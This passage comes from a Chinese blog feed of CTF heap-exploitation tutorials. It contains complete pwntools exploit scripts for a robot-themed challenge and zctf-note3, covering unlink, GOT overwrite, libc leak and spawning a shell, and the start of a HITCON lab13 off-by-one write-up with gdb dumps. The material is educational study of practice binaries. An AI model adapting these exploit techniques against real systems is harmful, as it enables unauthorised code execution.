class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(idx, size=<span class="number">0</span>)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Bender's intelligence: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">3</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Robot Devil's cruelty: "</span>, str(size))</span><br><span class="line">    <span class="keyword">elif</span> idx == <span class="number">6</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">"Increase Destructor's powerful: "</span>, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"2"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx, name)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, str(idx))</span><br><span class="line">    io.sendafter(<span class="string">"Robot's name: "</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">start_robot</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">off_by_one</span><span class="params">(byte)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Your choice :"</span>, <span class="string">"9999"</span> + byte)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(addr1, addr2)</span>:</span></span><br><span class="line">    change(<span class="number">1</span>, p64(addr1))</span><br><span class="line">    change(<span class="number">6</span>, p64(addr2))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    off_by_one(<span class="string">'\x01'</span>)</span><br><span class="line">    <span class="comment"># change fd pointer</span></span><br><span class="line">    change(<span class="number">2</span>, p64(<span class="number">0x0000000000603138</span>))</span><br><span class="line">    off_by_one(<span class="string">'\x00'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#pass the fastbin check size=0x20</span></span><br><span class="line">    add(<span class="number">3</span>, <span class="number">0x20</span>)</span><br><span class="line">    <span class="comment">#now idx2-&gt;0x603138-&gt;null</span></span><br><span class="line">    <span class="comment">#get malloc to -&gt; 0x603138</span></span><br><span class="line">    add(<span class="number">2</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="comment">#now 0x603138-&gt;null</span></span><br><span class="line">    add(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">#whell &lt;=2</span></span><br><span class="line">    remove(<span class="number">2</span>)</span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#now only have idx1 pointer-&gt;0x603138 , it's destructor_size</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#the size must bigger than remove(2) remove(3)'s  size</span></span><br><span class="line">    add(<span class="number">6</span>, <span class="number">4</span>)</span><br><span class="line">    add(<span class="number">3</span>, <span class="number">7</span>)</span><br><span class="line">    <span class="comment">#change idx6 size:1000</span></span><br><span class="line">    change(<span class="number">1</span>, p64(<span class="number">1000</span>))</span><br><span class="line">    ptr = <span class="number">0x00000000006030E8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x50</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x50</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x50</span>) <span class="comment">#pre_size</span></span><br><span class="line">    payload += p64(<span class="number">0xa0</span>) <span class="comment">#size</span></span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># unlink</span></span><br><span class="line">    remove(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">    payload = p64(<span class="number">0</span>)*<span class="number">2</span> + <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr)</span><br><span class="line">    change(<span class="number">6</span>, payload)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    </span><br><span class="line">    write(elf.got[<span class="string">'exit'</span>], <span class="number">0x0000000000401855</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># change robot_wheel to 3</span></span><br><span class="line">    write(<span class="number">0x603130</span>, <span class="number">3</span>)</span><br><span class="line">    change(<span class="number">1</span>, p64(elf.got[<span class="string">'puts'</span>]))</span><br><span class="line">    start_robot()</span><br><span class="line">    <span class="comment"># leak </span></span><br><span class="line">    io.recvuntil(<span class="string">" Thx "</span>)</span><br><span class="line">    puts_addr = u64(io.recv(<span class="number">6</span>).strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    io.success(<span class="string">"puts_addr: 0x%x"</span> % puts_addr)</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    write(elf.got[<span class="string">'atoi'</span>], system_addr)</span><br><span class="line">    io.send(<span class="string">"sh;#"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="zctf-note3"><a href="#zctf-note3" class="headerlink" title="zctf-note3"></a>zctf-note3</h2><p>这道题算自己做的了，自己分析漏洞点，自己做，不过有两个位置卡住了，暂时未得以解决先记录下来，从他人wp里获得的解决方案</p>
<h3 id="功能分析-1"><a href="#功能分析-1" class="headerlink" title="功能分析"></a>功能分析</h3><p>有增删查改，<br>查询部分是没用的，无法泄露</p>
<h3 id="漏洞点分析-1"><a href="#漏洞点分析-1" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h3><p>不知道为什么，看到这个读取函数瞬间就懂怎么做了</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> __int64 __<span class="function">fastcall <span class="title">sub_4008DD</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">char</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+Ch] [rbp-34h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+2Fh] [rbp-11h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+30h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">ssize_t</span> v7; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a3;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0L</span>L; a2 - <span class="number">1</span> &gt; i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, &amp;buf, <span class="number">1u</span>LL);</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    <span class="keyword">if</span> ( buf == v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(i + a1) = buf;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(a1 + i) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a2-1跟我前面做过的一两道题都类似，利用0-1负数，然后转成无符号比较，变成很大，也就是堆溢出</p>
<p><strong>注意：这里的坑点就是a3, a3假设被定为\n，我们sendline的时候sendline(p64(addr))会覆盖到下一个地址的最后一位，并将他改成\x00，这是最坑的点了，我被这个坑了好久</strong></p>
<h3 id="漏洞利用过程-3"><a href="#漏洞利用过程-3" class="headerlink" title="漏洞利用过程"></a>漏洞利用过程</h3><ol>
<li>准备工作</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br></pre></td></tr></table></figure>

<p>不用多说吧，每道堆题一样的套路</p>
<ol start="2">
<li>unlink部分</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">ptr = <span class="number">0x6020c8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(<span class="number">0x90</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p><strong>这里有坑，切记，不能删掉idx1在进行覆盖，会报错，至于具体报错原因我不清楚，我估计是fastbin链上修改成了错误的fd指针，检测到了，这个问题待解决</strong></p>
<p>简单的unlink</p>
<ol start="3">
<li>这里我利用了上一道题的思路，一样的做，修改idx0指向idx1指针部分，通过修改idx0，然后达到任意地址写</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line"><span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line"><span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>]) <span class="comment">#关键点，切记，不能破坏到下一个地址，不然会出错</span></span><br><span class="line"><span class="comment">#delete(1)</span></span><br><span class="line">edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>getshell</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> PwnContext.core <span class="keyword">import</span> *</span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = <span class="string">'./'</span> + <span class="string">'note3'</span></span><br><span class="line">elf = context.binary = ELF(exe)</span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">10000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#don't forget to change it</span></span><br><span class="line"><span class="comment">#ctx.binary = './' + 'note3'</span></span><br><span class="line">ctx.binary = exe</span><br><span class="line">libc = args.LIBC <span class="keyword">or</span> <span class="string">'libc.so.6'</span></span><br><span class="line">ctx.debug_remote_libc = <span class="literal">True</span></span><br><span class="line">ctx.remote_libc = libc</span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line">    io = ctx.start()</span><br><span class="line">    libc = ELF(libc)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(host,port)</span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"1"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the length of the note content:(less than 1024)\n"</span>, str(size))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the note content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"3"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the new content:\n"</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.sendlineafter(<span class="string">"option---&gt;&gt;\n"</span>, <span class="string">"4"</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">"Input the id of the note:\n"</span>, str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'a'</span>*<span class="number">0x8</span>) <span class="comment">#idx0</span></span><br><span class="line">    add(<span class="number">0</span>, <span class="string">'b'</span>*<span class="number">0x8</span>) <span class="comment">#idx1</span></span><br><span class="line">    add(<span class="number">0x80</span>, <span class="string">'c'</span>*<span class="number">0x80</span>) <span class="comment">#idx2</span></span><br><span class="line">    ptr = <span class="number">0x6020c8</span></span><br><span class="line">    payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>) + p64(ptr<span class="number">-0x18</span>) + p64(ptr<span class="number">-0x10</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x30</span>, <span class="string">'a'</span>)</span><br><span class="line">    payload += p64(<span class="number">0x30</span>)</span><br><span class="line">    payload += p64(<span class="number">0x90</span>)</span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">    puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">    puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">    atol_got = elf.got[<span class="string">'atol'</span>]</span><br><span class="line">    atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">    payload = <span class="string">'a'</span>*<span class="number">0x18</span> + p64(ptr+<span class="number">8</span>) + p64(elf.got[<span class="string">'free'</span>]) </span><br><span class="line">    <span class="comment">#payload = 'a'*0x18 + p64(free_got) + p64(puts_got)</span></span><br><span class="line">    edit(<span class="number">0</span>, payload)</span><br><span class="line">    <span class="comment">#edit(0, p64(puts_plt)[:-1])</span></span><br><span class="line">    edit(<span class="number">1</span>, p64(elf.plt[<span class="string">'puts'</span>])[:<span class="number">-1</span>])</span><br><span class="line">    <span class="comment">#delete(1)</span></span><br><span class="line">    edit(<span class="number">0</span>, p64(atol_got))</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    atol_addr = u64(io.recvline().strip().ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">    libc_base = atol_addr - libc.symbols[<span class="string">'atol'</span>]</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">    io.success(<span class="string">"libc_base: 0x%x"</span> % libc_base)</span><br><span class="line">    io.success(<span class="string">"atol_got: 0x%x"</span> % atol_got)</span><br><span class="line">    edit(<span class="number">0</span>, p64(atoi_got))</span><br><span class="line">    edit(<span class="number">1</span>, p64(system_addr)[:<span class="number">-1</span>])</span><br><span class="line">    gdb.attach(io)</span><br><span class="line">    io.sendline(<span class="string">"/bin/sh;#"</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    exp()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>


<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol>
<li>unlink部分完结了</li>
<li>unlink部分学习时间4天，现在对于unlink轻车熟路了，不过通常不是单一漏洞点，单一的好分析点</li>
<li>要多学学逆向，逆向起复杂的题目来真的难，像那个机器人那题，我连漏洞点都找不到，真的惨</li>
<li>我觉得机器人那题还有另外解法，因为4和5选项越界部分都没用上</li>
<li>感谢萝卜师傅的指导</li>
</ol>
<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://bbs.pediy.com/thread-247007.htm" target="_blank" rel="noopener">看雪大佬</a></p>
]]></content>
      <categories>
        <category>二进制</category>
        <category>pwn</category>
        <category>堆</category>
      </categories>
      <tags>
        <tag>pwn， 堆</tag>
      </tags>
  </entry>
  <entry>
    <title>pwn堆入门系列教程3</title>
    <url>/archives/undefined.html</url>
    <content><![CDATA[<h1 id="pwn堆入门系列教程3"><a href="#pwn堆入门系列教程3" class="headerlink" title="pwn堆入门系列教程3"></a>pwn堆入门系列教程3</h1><p><a href="https://xz.aliyun.com/t/6087" target="_blank" rel="noopener">pwn堆入门系列教程1</a><br><a href="https://xz.aliyun.com/t/6169" target="_blank" rel="noopener">pwn入门系列教程2</a></p><p>序言：这次终于过了off-by-one来到了Chunk Extend / Overlapping,这部分在上一节也进行了学习，所以难度相对来说不会是那么大，刚起初我以为，因为第一题很简单，但做到第二题，我发觉我连格式化字符串的漏洞都不会利用，真的是太菜了，后面看了看雪大佬的文章才会做</p><a id="more"></a>

<h2 id="1-1-HITCON-Trainging-lab13"><a href="#1-1-HITCON-Trainging-lab13" class="headerlink" title="1.1. HITCON Trainging lab13"></a>1.1. HITCON Trainging lab13</h2><p>这道题还是相对简单的，对于前面几道来说，上一道已经用过这种方法了，而且比这复杂许多，所以差不多了，不过还有些小细节注意下就好</p>
<h3 id="1-1-1-功能分析"><a href="#1-1-1-功能分析" class="headerlink" title="1.1.1. 功能分析"></a>1.1.1. 功能分析</h3><p>引用于ctf-wiki</p>
<ol>
<li>创建堆，根据用户输入的长度，申请对应内存空间，并利用 read 读取指定长度内容。这里长度没有进行检测，当长度为负数时，会出现任意长度堆溢出的漏洞。当然，前提是可以进行 malloc。此外，这里读取之后并没有设置 NULL。</li>
<li>编辑堆，根据指定的索引以及之前存储的堆的大小读取指定内容，但是这里读入的长度会比之前大 1，所以会存在 off by one 的漏洞。</li>
<li>展示堆，输出指定索引堆的大小以及内容。</li>
<li>删除堆，删除指定堆，并且将对应指针设置为了 NULL。</li>
</ol>
<h3 id="1-1-2-漏洞点分析"><a href="#1-1-2-漏洞点分析" class="headerlink" title="1.1.2. 漏洞点分析"></a>1.1.2. 漏洞点分析</h3><p>漏洞点存在off-by-one,通过off-by-one进行overlapping就成了</p>
<h3 id="1-1-3-漏洞利用过程"><a href="#1-1-3-漏洞利用过程" class="headerlink" title="1.1.3. 漏洞利用过程"></a>1.1.3. 漏洞利用过程</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/50gx 0x1775030-0x30</span><br><span class="line">0x1775000:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775010:	0x0000000000000018	0x0000000001775030</span><br><span class="line">0x1775020:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块1 chunk</span></span><br><span class="line">0x1775030:	0x0000000a31313131	0x0000000000000000</span><br><span class="line">0x1775040:	0x0000000000000000	0x0000000000000021 <span class="comment">#结构体1</span></span><br><span class="line">0x1775050:	0x0000000000000010	0x0000000001775070</span><br><span class="line">0x1775060:	0x0000000000000000	0x0000000000000021 <span class="comment">#数据块2 chunk</span></span><br><span class="line">0x1775070:	0x0000000a32323232	0x0000000000000000</span><br><span class="line">0x1775080:	0x0000000000000000	0x0000000000020f81</span><br><span class="line">0x1775090:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x17750f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775100:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775110:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775120:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775130:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775140:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775150:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775160:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775170:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1775180:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>


<p>攻击过程：</p>
<ol>
<li>创建两个堆块初始化(实际创了4个堆块，两个结构体堆块，两个数据堆块)至于一个为什么要0x18，因为要利用他会使用下个chunk的pre_size作为数据部分，这样才能off-by-one溢出到size</li>
<li>编辑第0块堆块，利用off-by-one覆盖第二块堆块的size，修改size为0x41<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">50</span>gx <span class="number">0x8a5030</span><span class="number">-0x30</span></span><br><span class="line"><span class="number">0x8a5000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5010</span>:	<span class="number">0x0000000000000018</span>	<span class="number">0x00000000008a5030</span></span><br><span class="line"><span class="number">0x8a5020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5030</span>:	<span class="number">0x0068732f6e69622f</span>	<span class="number">0x6161616161616161</span> #/bin/sh为后面做准备</span><br><span class="line"><span class="number">0x8a5040</span>:	<span class="number">0x6161616161616161</span>	<span class="number">0x0000000000000041</span> <span class="meta"># off-by-one</span></span><br><span class="line"><span class="number">0x8a5050</span>:	<span class="number">0x0000000000000010</span>	<span class="number">0x00000000008a5070</span></span><br><span class="line"><span class="number">0x8a5060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x8a5070</span>:	<span class="number">0x0000000a32323232</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line"><span class="number">0x8a5090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50a0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50e0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a50f0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5100</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5110</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5120</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5140</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5150</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5160</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x8a5170</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span 